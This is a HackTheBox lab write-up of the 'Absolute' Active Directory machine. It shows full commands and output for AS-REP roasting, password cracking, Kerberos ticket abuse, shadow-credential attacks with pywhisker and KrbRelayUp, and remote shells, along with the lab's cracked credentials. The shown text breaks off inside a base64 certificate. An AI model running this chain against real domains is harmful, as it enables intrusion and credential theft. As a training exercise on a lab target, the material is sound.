---
title: Absolute (HackTheBox Writeup)
date: 2023-05-27
categories: [Writeups, HTB]
tags: [Windows, Active Directory, Insane, AS-REP Roast attack, KrbRelay, Pivoting]
---

![](/assets/img/absolute/1.png)

Hi there! How are you doing? Today we are going to be solving my favourite `HTB` machine: `Absolute`. This is an `AD` machine, and that's the reason for me to love it. 
Let's stop talking and let's start!!
Contents of today's machine:
- `AS-REP Roast` attack
- Retriving tickets
- Bloodhound
- Checking `.exe` behaviour
- Pivoting
- Privilege Escalation `KrbRelay`

## Enumeration

- - -

First, we enumerate the opened ports with `nmap`:

```zsh
❯ nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 10.10.11.181 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 10:07 CEST
Initiating SYN Stealth Scan at 10:07
Scanning 10.10.11.181 [65535 ports]
Discovered open port 445/tcp on 10.10.11.181
Discovered open port 139/tcp on 10.10.11.181
Discovered open port 135/tcp on 10.10.11.181
Discovered open port 80/tcp on 10.10.11.181
Discovered open port 53/tcp on 10.10.11.181
Discovered open port 49702/tcp on 10.10.11.181
Discovered open port 49687/tcp on 10.10.11.181
Discovered open port 60555/tcp on 10.10.11.181
Discovered open port 5985/tcp on 10.10.11.181
Discovered open port 464/tcp on 10.10.11.181
Discovered open port 49673/tcp on 10.10.11.181
Discovered open port 593/tcp on 10.10.11.181
Discovered open port 49664/tcp on 10.10.11.181
Discovered open port 3268/tcp on 10.10.11.181
Discovered open port 49674/tcp on 10.10.11.181
Discovered open port 49667/tcp on 10.10.11.181
Discovered open port 49675/tcp on 10.10.11.181
Discovered open port 88/tcp on 10.10.11.181
Discovered open port 9389/tcp on 10.10.11.181
Discovered open port 49666/tcp on 10.10.11.181
Completed SYN Stealth Scan at 10:08, 25.13s elapsed (65535 total ports)
Nmap scan report for 10.10.11.181
Host is up, received user-set (0.043s latency).
Scanned at 2023-05-21 10:07:36 CEST for 25s
Not shown: 59105 closed tcp ports (reset), 6410 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE        REASON
53/tcp    open  domain         syn-ack ttl 127
80/tcp    open  http           syn-ack ttl 127
88/tcp    open  kerberos-sec   syn-ack ttl 127
135/tcp   open  msrpc          syn-ack ttl 127
139/tcp   open  netbios-ssn    syn-ack ttl 127
445/tcp   open  microsoft-ds   syn-ack ttl 127
464/tcp   open  kpasswd5       syn-ack ttl 127
593/tcp   open  http-rpc-epmap syn-ack ttl 127
3268/tcp  open  globalcatLDAP  syn-ack ttl 127
5985/tcp  open  wsman          syn-ack ttl 127
9389/tcp  open  adws           syn-ack ttl 127
49664/tcp open  unknown        syn-ack ttl 127
49666/tcp open  unknown        syn-ack ttl 127
49667/tcp open  unknown        syn-ack ttl 127
49673/tcp open  unknown        syn-ack ttl 127
49674/tcp open  unknown        syn-ack ttl 127
49675/tcp open  unknown        syn-ack ttl 127
49687/tcp open  unknown        syn-ack ttl 127
49702/tcp open  unknown        syn-ack ttl 127
60555/tcp open  unknown        syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 25.37 seconds
           Raw packets sent: 124812 (5.492MB) | Rcvd: 61576 (2.463MB)
```

Ok, so as always, let's extract the useful information with `extractPorts`:

Function `extractPorts`:

```bash
❯ which extractPorts
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	batcat extractPorts.tmp
	rm extractPorts.tmp
}
```

Now, let's extract the info:

```zsh
❯ extractPorts allPorts

    [*] Extracting information...

        [*] IP Address: 10.10.11.181
        [*] Open ports: 53,80,88,135,139,445,464,593,3268,5985,9389,49664,49666,49667,49673,49674,49675,49687,49702,60555
    
    [*] Ports copied to clipboard
```

After that, let's perform a deeper scan to those ports:

```zsh
❯ nmap -sCV -p53,80,88,135,139,445,464,593,3268,5985,9389,49664,49666,49667,49673,49674,49675,49687,49702,60555 10.10.11.181 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 10:11 CEST
Nmap scan report for absolute.htb (10.10.11.181)
Host is up (0.049s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Absolute
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-21 15:11:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-21T15:12:28+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2023-05-19T18:52:07
|_Not valid after:  2024-05-18T18:52:07
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
60555/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-05-21T15:12:22
|_  start_date: N/A
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.66 seconds
```

## Kerbrute & AS-REP

- - -

As we can see ports 80 & 88, it means that a web and a kerberos services are running, so let's add `absolute.htb` and `dc.absolute.htb` into our `/etc/hosts` file.

If we take a look at the web, we can see that there are some images. We can download them:

![](/assets/img/absolute/8.png)

```zsh
❯ for i in {1..10}; do wget --timeout=10 "http://absolute.htb/images/hero_$i.jpg" &>/dev/null; done
                                                                                                                                                                
❯ ls
hero_1.jpg  hero_2.jpg  hero_3.jpg  hero_4.jpg  hero_5.jpg  hero_6.jpg
```

Now, we can pass the pictures to `exiftool`:

```zsh
❯ exiftool hero_*.jpg | grep Author
Author                          : James Roberts
Author                          : Michael Chaffrey
Author                          : Donald Klay
Author                          : Sarah Osvald
Author                          : Jeffer Robinson
Author                          : Nicole Smith
```

Perfect! Here we have some users of the domain, now, let's enumerate them with `kerbrute`:

```zsh
❯ ./kerbrute userenum -d absolute.htb --dc 10.10.11.181 users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/21/23 - Ronnie Flathers @ropnop

2023/05/21 10:29:56 >  Using KDC(s):
2023/05/21 10:29:56 >  	10.10.11.181:88

2023/05/21 10:29:56 >  [+] VALID USERNAME:	j.roberts@absolute.htb
2023/05/21 10:29:56 >  [+] VALID USERNAME:	m.chaffrey@absolute.htb
2023/05/21 10:29:56 >  [+] VALID USERNAME:	s.osvald@absolute.htb
2023/05/21 10:29:56 >  [+] VALID USERNAME:	j.robinson@absolute.htb
2023/05/21 10:29:56 >  [+] VALID USERNAME:	n.smith@absolute.htb
2023/05/21 10:29:56 >  [+] VALID USERNAME:	d.klay@absolute.htb
2023/05/21 10:29:56 >  Done! Tested 18 usernames (6 valid) in 0.429 seconds
```

Ok, so we see that all of them are valid, perfect!
Now, we can try `AS-REP Roasting` attack:

```zsh
❯ impacket-GetNPUsers absolute.htb/ -no-pass -usersfile users.txt
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User j.roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User m.chaffrey doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$d.klay@ABSOLUTE.HTB:f0900ae8b2b48f1aad819558dd9c823c$15c78a4c3e0f1a17f0c55b2dc1c3b044c0b009f6022e67f94a1565624fec9d5062d2a7c092472b1fa43be5bf619c997bcd6bd57c09907700b30f19d9dc5466a85e1591cf201cf965b285212f43ef131fe058b7d6d1eb0b90c2e870f70b7d3d6824b6c1cfb60508ccbfcd69f4076271e74c5b985ee2ab2d56413ed2955e5a5b3bb21e8903b16e5bc46a9c7fee62ad77f14d1c7a8fd1b49c5255f029cea9ba18c68673ed9c77f585371b6dbee360e7efba2b8f9567403b150f3875c0d433082db15d0da36e049c3b9f23c69c2b425b2503890b9cf0c7ca148738fcd7ecf0744881ffed3bae0b1945cdbcd21eea
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User s.osvald doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User j.robinson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User n.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Perfect!! The `AS-REP Roasting` worked for user `d.klay`. Let's save that hash and crack it!:

```zsh
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Darkmoonsky248girl ($krb5asrep$23$d.klay@ABSOLUTE.HTB)     
1g 0:00:00:19 DONE (2023-05-21 10:33) 0.05213g/s 585943p/s 585943c/s 585943C/s DarrenCahppell..Danuelle
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## Retriving tickets

- - -

Great!! Now we have a password and a user. 
Ok, so this password and user didn't work for connecting with `evil-winrm`, so let's check more things with `crackmapexec`:

```zsh
❯ cme smb absolute.htb -u users.txt -p 'Darkmoonsky248girl' --continue-on-success
SMB         absolute.htb    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         absolute.htb    445    DC               [-] absolute.htb\James.Roberts:Darkmoonsky248girl STATUS_LOGON_FAILURE 
SMB         absolute.htb    445    DC               [-] absolute.htb\jroberts:Darkmoonsky248girl STATUS_LOGON_FAILURE 
SMB         absolute.htb    445    DC               [-] absolute.htb\j.roberts:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
SMB         absolute.htb    445    DC               [-] absolute.htb\Michael.Chaffrey:Darkmoonsky248girl STATUS_LOGON_FAILURE 
SMB         absolute.htb    445    DC               [-] absolute.htb\mchaffrey:Darkmoonsky248girl STATUS_LOGON_FAILURE 
SMB         absolute.htb    445    DC               [-] absolute.htb\m.chaffrey:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
SMB         absolute.htb    445    DC               [-] absolute.htb\Donald.Klay:Darkmoonsky248girl STATUS_LOGON_FAILURE 
SMB         absolute.htb    445    DC               [-] absolute.htb\dklay:Darkmoonsky248girl STATUS_LOGON_FAILURE 
SMB         absolute.htb    445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
SMB         absolute.htb    445    DC               [-] absolute.htb\Sarah.Osvald:Darkmoonsky248girl STATUS_LOGON_FAILURE 
SMB         absolute.htb    445    DC               [-] absolute.htb\sosvald:Darkmoonsky248girl STATUS_LOGON_FAILURE 
SMB         absolute.htb    445    DC               [-] absolute.htb\s.osvald:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
SMB         absolute.htb    445    DC               [-] absolute.htb\Jeffer.Robinson:Darkmoonsky248girl STATUS_LOGON_FAILURE 
SMB         absolute.htb    445    DC               [-] absolute.htb\jrobinson:Darkmoonsky248girl STATUS_LOGON_FAILURE 
SMB         absolute.htb    445    DC               [-] absolute.htb\j.robinson:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
SMB         absolute.htb    445    DC               [-] absolute.htb\Nicole.Smith:Darkmoonsky248girl STATUS_LOGON_FAILURE 
SMB         absolute.htb    445    DC               [-] absolute.htb\nsmith:Darkmoonsky248girl STATUS_LOGON_FAILURE 
SMB         absolute.htb    445    DC               [-] absolute.htb\n.smith:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION
```

Nothing useful. 
We can attempt with LDAP as well and get a false result. It seems that **passwords are not accepted here**. So, the next form of authentication is through tickets. Now the goal is to somehow get a ticket to authenticate into the machine. Once we get some form of ticket, we can perhaps continue with Bloodhound, login or something.

So, now, let's retrive a ticket using `getTGT`:

```zsh
❯ impacket-getTGT -dc-ip dc.absolute.htb absolute.htb/d.klay:Darkmoonsky248girl
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in d.klay.ccache
```

We can attempt `kerberoasting` the machine to try and get some kind of service ticket using the credentials using `GetUserSPNs`.

```zsh
❯ impacket-GetUserSPNs absolute.htb/d.klay:Darkmoonsky248girl -dc-ip dc.absolute.htb -request -k -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

We can fix this error pretty easily:

```zsh
❯ sudo timedatectl set-ntp false

❯ sudo ntpdate -s absolute.htb
```

Kerberoasting reveals that there are no `SPNs` to roast. Instead, we can use this ticket with `crackmapexec` to enumerate `LDAP` and `SMB`. You can read the `crackmapexec` documentation [here](https://wiki.porchetta.industries/getting-started/using-kerberos)

```zsh
❯ cme ldap -u d.klay -d absolute.htb -k --kdcHost dc.absolute.htb --users 10.10.11.181
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.181    389    DC               [+] absolute.htb\
LDAP        10.10.11.181    389    DC               [*] Total records returned 20
LDAP        10.10.11.181    389    DC               Administrator   Build-in account for administering the computer/domain
LDAP        10.10.11.181    389    DC               Guest           Build-in account for guest access the computer/domain
LDAP        10.10.11.181    389    DC               svc_smb         AbsoluteSMBService123!
```
**_truncated_**

Now, let's retrive the `svc_smb` user's ticket:

```zsh
❯ impacket-getTGT -dc-ip dc.absolute.htb absolute.htb/svc_smb:AbsoluteSMBService123!
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in svc_smb.ccache
```

Interesting, now that we have a ticket, we can export this. I found that we can access `shares` from the `DC` using this ticket to authenticate ourselves.

```zsh
❯ smbclient.py -k dc.absolute.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands

# ls
[-] No share selected
# shares
ADMIN$
C$
IPC$
NETLOGIN
Shared
SYSVOL
# use shared
# ls
drw-rw-rw-      0 Sun May 21 18:17 2023 .
drw-rw-rw-      0 Sun May 21 18:17 2023 ..
-rw-rw-rw-      0 Sun May 21 18:17 2023 compiler.sh
-rw-rw-rw-      0 Sun May 21 18:17 2023 test.exe
```

Nice! The program here seems to be some form of script that creates a binary:

```bash
#!/bin/bash

nim c -d:mingw --app:gui --cc:gcc -d:danger -d:strip $1
```

Pooking around the shares, we don't seem to get much from it. We could decompiled the binary, and perhaps we could find a password there. 
The next step is to use Bloodhound, since we have credentials and a ticket:

```zsh
❯ python3 bloodhound.py -u redacted -k -d absolute.htb -dc dc.absolute.htb -ns 10.10.11.181 --dns-tcp --zip -no-pass -c All
INFO: Found AD domain: absolute.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 18 users
INFO: Found 55 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.absolute.htb
INFO: Ignoring host dc.absolute.htb since its reported name  does not match
INFO: Done in 00M 02S
INFO: Compressing output into 20220926135518_bloodhound.zip
```

Now we just need to fire up `bloodhound` and `neo4j` to view this data in a neat format. Bloodhound reveals a few users that are relevant:

![](/assets/img/absolute/2.png)

Out of all of these users, `m.lovegod` has the most privileges. The user owns the Network Audit group. This group has GenericWrite over the WinRM_User, which I suspect is where the user flag would be. So our exploit path is clear:

![](/assets/img/absolute/3.png)

![](/assets/img/absolute/4.png)

We now need to somehow get a ticket from the `m.lovegod` user and gain access as the `winrm_user` to get a shell.

## Test.exe

- - -

When we run the binary on our Windows VM, it seems to exit straightaway. Weird, but maybe it is trying to make external connections. We can open Wireshark to see what can we capture from it. I found this interesting bit here when I connected to the HTB VPN:

![](/assets/img/absolute/5.png)

Now we have credentials for this user!!

## Pivoting

- - -

Now that we know that the `m.lovegod` user owns the Network Audit group, and members of that group have GenericWrite over the `winrm_user`, we need to somehow add him into the group. We can use `pywhisker` to do so. 
First, we need to request a ST using `impacket-getTGT` using these credentials. Then we can export to `KRB5CCNAME`:

```zsh
❯ impacket-getTGT 'absolute.htb/m.lovegod:AbsoluteLDAP2022!'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in m.lovegod.ccache

❯ export KRB5CCNAME=m.lovegod.ccache
```

The tricky part is figuring out how to use this ticket. The easiest way to do this is to use a `Windows VM` connected to the `VPN` and run some `Powerview` commands on it, such as `Add-DomainObjectAcl` and stuff. We have to do this because it is not possible for us to use this ticket to add group members to the `Network Audit` group from a Linux machine. (I could not make pywhisker or dacledit) to work.

Anyways, let's boot up a `Windows VM` and do the following:

- Download `Active Directory` and `Powerview` modules.
- Connect to `HTB openvpn`.
- Add `absolute.htb` to `C:\Windows\System32\drivers\etc\hosts` file.
- Change the Internet time: Control Panel >  Clock and Region > Date and Time > Internet Time and add IP address
- Change `Network DNS Server` to the IP address of the `DC`: Control Panel > Network and Internet > Network and Sharing Center > Change Adapter Settings > Properties of the VPN adapter > Internet Procotol Version 4 Properties > Add the IP of the DC to DNS server.

After that, we need to run this commands:

```powershell
Import-Module .\PowerView.ps1
$SecPassword = ConvertTo-SecureString "AbsoluteLDAP2022!" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential("Absolute.htb\m.lovegod", $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Network Audit" -Rights all -DomainController dc.absolute.htb -PrincipalIdentity "m.lovegod"
Add-ADPrincipalGroupMembership -Identity m.lovegod -MemberOf "Network Audit" -Credential $Cred -server dc.absolute.htb
```

![](/assets/img/absolute/9.png)

You might need to run the last command again and again until you get no errors, the AD seems to reset this change very fast.
Now, change to your attacker machine **quickly** and run the following command:

```zsh
❯ python pywhisker/pywhisker.py -d absolute.htb -u "m.lovegod" -k --no-pass -t "winrm_user" --action "add"
[*] Searching for the target account
[*] Target user found: CN=winrm_user,CN=Users,DC=absolute,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 5433341b-4b83-71bd-d380-aceae025aa68
[*] Updating the msDS-KeyCredentialLink attribute of winrm_user
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: fCvi61Aq.pfx
[*] Must be used with password: mrKuvg3I5GVdZ8J4Jinj
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Now we have a .pfx file that we can use to get a .ccache file for the winrm_user. This can be done with gettgtpkinit.py:

```zsh
python PKINITtools/gettgtpkinit.py absolute.htb/winrm_user -cert-pfx fCvi61Aq.pfx -pfx-pass  mrKuvg3I5GVdZ8J4Jinj winrmCcache
2023-04-15 03:14:21,214 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2023-04-15 03:14:21,225 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2023-04-15 03:14:33,223 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2023-04-15 03:14:33,223 minikerberos INFO     1cf0779f2e031f99184a8115b0b1e6d838f2d25fef528b9084f7223e1da6727e
INFO:minikerberos:1cf0779f2e031f99184a8115b0b1e6d838f2d25fef528b9084f7223e1da6727e
2023-04-15 03:14:33,225 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Now, let's export the variable:

```zsh
export KRB5CCNAME = winrm_user.ccache
```

Now, **quickly**, let's connect with `evil-winrm`:

```zsh
evil-winrm -i dc.absolute.htb -r absolute.htb

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\winrm_user\Documents> 
```

Great!!! Now we can capture the user flag!! :D

The `GenericWrite` permission on the user allows us to write properties. Hence, we used `pywhisker` to add a new `KeyCredential` as `m.lovegod `to the `winrm_user msDs-KeyCredentialLink` attribute. This was done because we don't have a shell. 
By creating a shadow credential through `GenericWrite privileges`, we can add more methods of which an account has to obtain a `Kerberos TGT`. `pyWhisker` is just a Python implementation of the main tool, `Whisker`. The main resource I used for my research was [here](https://pentestlab.blog/tag/msds-keycredentiallink/)

## Privilege escalation

- - -

The central theme around this machine is to continuously use Kerberos to escalate our privileges. We know that this machine supports PKINIT, allowing for users to authenticate with certificates (that's how we got our user access). Going along that line, we can continue to abuse Shadow Credentials to dump the NTLM hashes.

We'll need the following resources:

- KrbRelay
- Rubeus
- RunasCs

After that, we'll need to add a `Shadow Credential` using `KrbRelay` trhought the `m.lovegod` user:

```zsh
.\RunasCs.exe m.lovegod AbsoluteLDAP2022! -d absolute.htb -l 9 "C:\Users\winrm_user\KrbRelayUp.exe -spn ldap/dc.absolute.htb -clsid {B4D6E8A2-0F7C-4D3A-BE95-1A65BC3E9F24} -shadowcred"
```

This will generate something like this:

```zsh
*Evil-WinRM* PS C:\users\winrm_user\documents> ./RunasCs.exe m.lovegod 'AbsoluteLDAP2022!'-d absolute.htb -l 9 "C:\Users\winrm_user\Documents\KrbRelayUp.exe relay -m shadowcred -cls {752073A1-23F2-4396-85F0-8FDB879ED0ED}"

KrbRelayUp - Relaying you to SYSTEM


[+] Rewriting function table
[+] Rewriting PEB
[+] Init COM server
[+] Register COM server
[+] Forcing SYSTEM authentication
[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
[+] LDAP session established
[+] Generating certificate
[+] Certificate generated
[+] Generating KeyCredential
[+] KeyCredential generated with DeviceID 64bd660c-e106-4cfb-bc1b-48f9477e4a37
[+] KeyCredential added successfully
[+] Run the spawn method for SYSTEM shell:
    ./KrbRelayUp.exe spawn -m shadowcred -d absolute.htb -dc dc.absolute.htb -ce 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